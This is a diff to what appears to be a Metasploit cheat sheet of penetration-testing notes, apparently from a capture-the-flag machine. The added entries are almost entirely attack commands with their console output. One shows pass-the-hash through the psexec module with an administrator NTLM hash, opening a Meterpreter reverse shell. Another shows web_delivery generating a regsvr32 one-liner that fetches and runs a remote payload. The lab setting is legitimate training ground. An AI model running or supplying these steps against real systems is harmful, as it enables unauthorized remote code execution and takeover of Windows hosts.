@@ -333,6 +333,54 @@ msf5 auxiliary(admin/mssql/mssql_exec) > exploit
 [*] Auxiliary module execution completed
 
 
+#When have access to smb & Administrator hash
+msf5 > use exploit/windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) > set rhost x.x.x.x
+rhost => x.x.x.x
+msf5 exploit(windows/smb/psexec) > set smbuser administrator
+smbuser => administrator
+msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+smbpass => aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+msf5 exploit(windows/smb/psexec) > set lhost x.x.x.x
+lhost => x.x.x.x
+msf5 exploit(windows/smb/psexec) > set SMBDomain jeeves
+SMBDomain => jeeves
+
+
+
+msf5 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on x.x.x.x:4444 
+[*] x.x.x.x:445 - Connecting to the server...
+[*] x.x.x.x:445 - Authenticating to x.x.x.x:445|jeeves as user 'administrator'...
+[*] x.x.x.x:445 - Selecting PowerShell target
+[*] x.x.x.x:445 - Executing the payload...
+[+] x.x.x.x:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (180291 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:49676) at 2019-11-07 16:30:20 +0000
+
+
+#Remote web delivery for meterpreter shell after shell access (several targets)
+use multi/script/web_delivery
+set payload windows/meterpreter/reverse_tcp
+set target 3 #sets Regsvr32
+msf5 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on x.x.x.x:4444 
+msf5 exploit(multi/script/web_delivery) > [*] Using URL: http://x.x.x.x:8080/IYh8OzEYxNRCQ
+[*] Server started.
+[*] Run the following command on the target machine:
+regsvr32 /s /n /u /i:http://x.x.x.x:8080/IYh8OzEYxNRCQ.sct scrobj.dll
+
+[*] x.x.x.x      web_delivery - Handling .sct Request
+[*] x.x.x.x      web_delivery - Delivering Payload (1941) bytes
+[*] Sending stage (180291 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:49162) at 2019-11-07 18:22:47 +0000
+
 
 #Save Windows systeminfo for searching exploits
 meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
@@ -353,3 +401,4 @@ meterpreter > upload 41020.exe
 [*] uploading  : 41020.exe -> 41020.exe
 [*] Uploaded 547.00 KiB of 547.00 KiB (100.0%): 41020.exe -> 41020.exe
 [*] uploaded   : 41020.exe -> 41020.exe
+
